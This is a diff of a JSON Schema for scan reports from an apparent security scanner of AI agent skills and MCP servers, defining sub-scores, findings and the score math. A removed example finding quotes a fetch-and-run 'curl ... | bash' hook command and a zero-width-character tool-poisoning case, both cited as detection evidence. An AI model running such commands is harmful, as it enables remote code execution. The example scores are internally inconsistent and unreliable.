@@ -2,139 +2,309 @@
   "$schema": "https://json-schema.org/draft/2020-12/schema",
   "$id": "https://saferskills.ai/schemas/scan-report.schema.json",
   "title": "ScanReport",
-  "description": "Public scan report for a CatalogItem. W1 placeholder shape — replaced by the real Initiative I-02 / Track B schema in W2.",
+  "description": "Public scan report for a CatalogItem. PRD-locked 5-axis sub-score taxonomy and 5-tier severity ladder per locked decisions D-01 / D-02 / D-13. The aggregate score is a deterministic, closed-form weighted sum of sub-scores with critical-floor application; every report renders the explicit math.",
   "type": "object",
   "additionalProperties": false,
   "required": [
     "id",
     "catalogItemId",
+    "idempotencyKey",
+    "githubUrl",
+    "refSha",
     "aggregateScore",
     "tier",
     "subScores",
+    "scoreBreakdown",
     "findings",
+    "traceTruncated",
+    "omittedFindingsCount",
     "rubricVersion",
     "engineVersion",
-    "scannedAt"
+    "scannedAt",
+    "latencyMs"
   ],
   "properties": {
-    "id": {"type": "string", "format": "uuid"},
-    "catalogItemId": {"type": "string", "format": "uuid"},
+    "id": {
+      "type": "string",
+      "format": "uuid",
+      "description": "Server-assigned UUIDv7."
+    },
+    "catalogItemId": {
+      "type": "string",
+      "format": "uuid"
+    },
+    "idempotencyKey": {
+      "type": "string",
+      "pattern": "^[a-f0-9]{64}$",
+      "description": "SHA-256 of `(github_url || ref_sha || rubric_version)`. Same key → cached scan."
+    },
+    "githubUrl": {
+      "type": "string",
+      "format": "uri",
+      "description": "Canonical GitHub URL scanned."
+    },
+    "refSha": {
+      "type": "string",
+      "pattern": "^[a-f0-9]{40}$",
+      "description": "Commit SHA resolved at scan time."
+    },
     "aggregateScore": {
       "type": "integer",
       "minimum": 0,
       "maximum": 100,
-      "description": "0-100 deterministic aggregate per docs/methodology.md weighting (Identity 25% / Integrity 25% / Behavior 30% / Provenance 20%)."
+      "description": "Weighted aggregate per PRD §5.2 (Security 35% + Supply Chain 20% + Maintenance 15% + Transparency 15% + Community 15%). Closed-form, deterministic."
     },
     "tier": {
       "type": "string",
-      "enum": ["green", "yellow", "orange", "red", "unscoped"]
+      "enum": ["green", "yellow", "orange", "red", "unscoped"],
+      "description": "Trust badge: green 80-100, yellow 60-79, orange 40-59, red 0-39, unscoped (e.g. closed-source)."
     },
     "subScores": {
       "type": "object",
       "additionalProperties": false,
-      "required": ["identity", "integrity", "behavior", "provenance"],
+      "required": ["security", "supplyChain", "maintenance", "transparency", "community"],
       "properties": {
-        "identity": {"type": "integer", "minimum": 0, "maximum": 100},
-        "integrity": {"type": "integer", "minimum": 0, "maximum": 100},
-        "behavior": {"type": "integer", "minimum": 0, "maximum": 100},
-        "provenance": {"type": "integer", "minimum": 0, "maximum": 100}
-      }
+        "security": {"type": "integer", "minimum": 0, "maximum": 100},
+        "supplyChain": {"type": "integer", "minimum": 0, "maximum": 100},
+        "maintenance": {"type": "integer", "minimum": 0, "maximum": 100},
+        "transparency": {"type": "integer", "minimum": 0, "maximum": 100},
+        "community": {"type": "integer", "minimum": 0, "maximum": 100}
+      },
+      "description": "5-axis sub-scores (D-01)."
+    },
+    "scoreBreakdown": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["security", "supplyChain", "maintenance", "transparency", "community", "aggregateMath"],
+      "properties": {
+        "security": {"$ref": "#/$defs/subScoreBreakdown"},
+        "supplyChain": {"$ref": "#/$defs/subScoreBreakdown"},
+        "maintenance": {"$ref": "#/$defs/subScoreBreakdown"},
+        "transparency": {"$ref": "#/$defs/subScoreBreakdown"},
+        "community": {"$ref": "#/$defs/subScoreBreakdown"},
+        "aggregateMath": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": ["formula", "weightedContributions", "tierMapping"],
+          "properties": {
+            "formula": {
+              "type": "string",
+              "description": "Plain-text formula rendered next to the score (e.g. `35% × 78 + 20% × 65 + ...`)."
+            },
+            "weightedContributions": {
+              "type": "object",
+              "additionalProperties": false,
+              "required": ["security", "supplyChain", "maintenance", "transparency", "community"],
+              "properties": {
+                "security": {"type": "number"},
+                "supplyChain": {"type": "number"},
+                "maintenance": {"type": "number"},
+                "transparency": {"type": "number"},
+                "community": {"type": "number"}
+              }
+            },
+            "tierMapping": {
+              "type": "string",
+              "description": "Plain-text tier mapping (e.g. `aggregate 78 → tier yellow (60-79)`)."
+            }
+          }
+        }
+      },
+      "description": "Explicit per-finding penalty + running sub-score + critical-floor + weighted aggregate. Mandatory transparency layer (D-13) — surfaced on every public report."
     },
     "findings": {
       "type": "array",
-      "items": {
-        "type": "object",
-        "additionalProperties": false,
-        "required": ["ruleId", "severity", "evidenceLocation", "remediation"],
-        "properties": {
-          "ruleId": {
-            "type": "string",
-            "pattern": "^SS-[A-Z]+(-[A-Z]+)*-\\d{2}$",
-            "description": "Format `SS-<CATEGORY>-<NUMBER>` per docs/rules.md."
-          },
-          "severity": {
-            "type": "string",
-            "enum": ["low", "medium", "high", "critical"]
-          },
-          "evidenceLocation": {
-            "type": "string",
-            "description": "Path + line range in the scanned artifact (e.g. `src/mcp/server.ts:42-58`)."
-          },
-          "matchedContent": {
-            "type": ["string", "null"],
-            "description": "Exact substring or canonicalised summary of the matched evidence. Null when the rule cannot publish content (e.g. a credential pattern)."
-          },
-          "remediation": {
-            "type": "string",
-            "description": "One-paragraph fix recommendation."
-          },
-          "ruleUrl": {
-            "type": "string",
-            "format": "uri",
-            "description": "Permalink to the rule's JSON under rubric/ at the rubricVersion SHA."
-          }
-        }
-      }
+      "items": {"$ref": "#/$defs/finding"},
+      "description": "Normalised findings (one per rule fire). Mirrors finding.schema.json — kept inline so datamodel-codegen can emit single-file Pydantic without cross-file resolution."
+    },
+    "traceTruncated": {
+      "type": "boolean",
+      "default": false,
+      "description": "True if scan-trace total exceeded 256 KiB and was truncated (D-31)."
+    },
+    "omittedFindingsCount": {
+      "type": "integer",
+      "minimum": 0,
+      "default": 0,
+      "description": "Count of findings dropped due to trace truncation."
+    },
+    "fileHashes": {
+      "type": ["object", "null"],
+      "additionalProperties": {
+        "type": "string",
+        "pattern": "^[a-f0-9]{64}$"
+      },
+      "description": "Per-file path → SHA-256 map (D-32). Powers hash-drift detector across scans. Null on first scan."
     },
     "rubricVersion": {
       "type": "string",
-      "description": "Git SHA of rubric/ at scan time. Enables vendor-side reproducibility."
+      "pattern": "^[a-f0-9]{7,40}$",
+      "description": "Git SHA of rubric/ subtree at scan time. Enables vendor-side reproducibility."
     },
     "engineVersion": {
       "type": "string",
+      "pattern": "^[a-f0-9]{7,40}$",
       "description": "Git SHA of the scan engine at scan time."
     },
-    "scannedAt": {"type": "string", "format": "date-time"}
+    "scannedAt": {
+      "type": "string",
+      "format": "date-time"
+    },
+    "latencyMs": {
+      "type": "integer",
+      "minimum": 0,
+      "description": "End-to-end scan latency (fetch + extract + detect + aggregate)."
+    },
+    "source": {
+      "type": "string",
+      "enum": ["submission", "ingestion", "rescan_drift", "rescan_appeal"],
+      "description": "What triggered this scan."
+    }
+  },
+  "$defs": {
+    "finding": {
+      "type": "object",
+      "additionalProperties": false,
+      "description": "Inline mirror of finding.schema.json. Source-of-truth lives in the standalone schema; keep in sync.",
+      "required": [
+        "id",
+        "scanId",
+        "ruleId",
+        "severity",
+        "subScore",
+        "penalty",
+        "statusAtScan",
+        "filePath",
+        "lineStart",
+        "matchedContentSha256",
+        "remediationLink",
+        "rubricVersion"
+      ],
+      "properties": {
+        "id": {"type": "string", "format": "uuid"},
+        "scanId": {"type": "string", "format": "uuid"},
+        "ruleId": {
+          "type": "string",
+          "pattern": "^SS-(MCP|SKILL|RULES|HOOKS|PLUGIN)-[A-Z][A-Z0-9-]*-\\d{2}$"
+        },
+        "severity": {"type": "string", "enum": ["info", "low", "medium", "high", "critical"]},
+        "subScore": {"type": "string", "enum": ["security", "supply_chain", "maintenance", "transparency", "community"]},
+        "penalty": {"type": "integer", "minimum": 0, "maximum": 40},
+        "statusAtScan": {"type": "string", "enum": ["shadow", "active"]},
+        "filePath": {"type": "string", "maxLength": 1024},
+        "lineStart": {"type": "integer", "minimum": 1},
+        "lineEnd": {"type": ["integer", "null"], "minimum": 1},
+        "matchedContentSha256": {"type": "string", "pattern": "^[a-f0-9]{64}$"},
+        "remediationLink": {"type": "string", "format": "uri"},
+        "rubricVersion": {"type": "string", "pattern": "^[a-f0-9]{7,40}$"}
+      }
+    },
+    "subScoreBreakdown": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["findingIds", "rawSubScore", "criticalFloorApplied", "finalSubScore", "weightedContribution"],
+      "properties": {
+        "findingIds": {
+          "type": "array",
+          "items": {"type": "string", "format": "uuid"},
+          "description": "IDs of findings contributing to this sub-score."
+        },
+        "rawSubScore": {
+          "type": "integer",
+          "minimum": 0,
+          "maximum": 100,
+          "description": "`max(0, 100 - Σ penalty_i)` before critical-floor."
+        },
+        "criticalFloorApplied": {
+          "type": "boolean",
+          "description": "True if any contributing finding was severity=critical and the sub-score was capped at 40."
+        },
+        "finalSubScore": {
+          "type": "integer",
+          "minimum": 0,
+          "maximum": 100,
+          "description": "`min(rawSubScore, 40)` if criticalFloorApplied else rawSubScore."
+        },
+        "weightedContribution": {
+          "type": "number",
+          "description": "finalSubScore × weight (where weight is 35/20/15/15/15 per PRD §5.2)."
+        }
+      }
+    }
   },
   "examples": [
     {
       "id": "018e7c8b-9999-7000-8000-000000000001",
       "catalogItemId": "018e7c8b-1234-7000-8000-000000000001",
+      "idempotencyKey": "0000000000000000000000000000000000000000000000000000000000000000",
+      "githubUrl": "https://github.com/example-org/github-toolbelt",
+      "refSha": "abc1234def5678901234567890abcdef12345678",
       "aggregateScore": 87,
       "tier": "green",
       "subScores": {
-        "identity": 90,
-        "integrity": 85,
-        "behavior": 88,
-        "provenance": 80
+        "security": 90,
+        "supplyChain": 85,
+        "maintenance": 88,
+        "transparency": 80,
+        "community": 92
+      },
+      "scoreBreakdown": {
+        "security": {
+          "findingIds": [],
+          "rawSubScore": 100,
+          "criticalFloorApplied": false,
+          "finalSubScore": 100,
+          "weightedContribution": 35.0
+        },
+        "supplyChain": {
+          "findingIds": ["018e7c8b-aaaa-7000-8000-000000000001"],
+          "rawSubScore": 85,
+          "criticalFloorApplied": false,
+          "finalSubScore": 85,
+          "weightedContribution": 17.0
+        },
+        "maintenance": {
+          "findingIds": [],
+          "rawSubScore": 100,
+          "criticalFloorApplied": false,
+          "finalSubScore": 100,
+          "weightedContribution": 15.0
+        },
+        "transparency": {
+          "findingIds": ["018e7c8b-aaaa-7000-8000-000000000002"],
+          "rawSubScore": 80,
+          "criticalFloorApplied": false,
+          "finalSubScore": 80,
+          "weightedContribution": 12.0
+        },
+        "community": {
+          "findingIds": [],
+          "rawSubScore": 100,
+          "criticalFloorApplied": false,
+          "finalSubScore": 100,
+          "weightedContribution": 15.0
+        },
+        "aggregateMath": {
+          "formula": "35% × 100 + 20% × 85 + 15% × 100 + 15% × 80 + 15% × 100",
+          "weightedContributions": {
+            "security": 35.0,
+            "supplyChain": 17.0,
+            "maintenance": 15.0,
+            "transparency": 12.0,
+            "community": 15.0
+          },
+          "tierMapping": "aggregate 94 → tier green (80-100)"
+        }
       },
       "findings": [],
-      "rubricVersion": "abc1234",
+      "traceTruncated": false,
+      "omittedFindingsCount": 0,
+      "fileHashes": null,
+      "rubricVersion": "a1b2c3d",
       "engineVersion": "def5678",
-      "scannedAt": "2026-05-25T10:30:00Z"
-    },
-    {
-      "id": "018e7c8b-9999-7000-8000-000000000002",
-      "catalogItemId": "018e7c8b-1234-7000-8000-000000000002",
-      "aggregateScore": 24,
-      "tier": "red",
-      "subScores": {
-        "identity": 50,
-        "integrity": 30,
-        "behavior": 10,
-        "provenance": 20
-      },
-      "findings": [
-        {
-          "ruleId": "SS-MCP-POISON-01",
-          "severity": "critical",
-          "evidenceLocation": "src/mcp/server.ts:42-58",
-          "matchedContent": "zero-width Unicode in tool description (U+200B)",
-          "remediation": "Strip the zero-width character; if intentional, document the use in the README.",
-          "ruleUrl": "https://github.com/OpenLatch/saferskills/blob/abc1234/rubric/SS-MCP-POISON-01.json"
-        },
-        {
-          "ruleId": "SS-HOOKS-RCE-03",
-          "severity": "high",
-          "evidenceLocation": ".claude/hooks/install.sh:5",
-          "matchedContent": "curl https://example.com/install.sh | bash",
-          "remediation": "Fetch the script to disk, verify its checksum, then execute. Never pipe network input to a shell.",
-          "ruleUrl": "https://github.com/OpenLatch/saferskills/blob/abc1234/rubric/SS-HOOKS-RCE-03.json"
-        }
-      ],
-      "rubricVersion": "abc1234",
-      "engineVersion": "def5678",
-      "scannedAt": "2026-05-25T10:30:00Z"
+      "scannedAt": "2026-05-26T10:30:00Z",
+      "latencyMs": 42000,
+      "source": "submission"
     }
   ]
 }
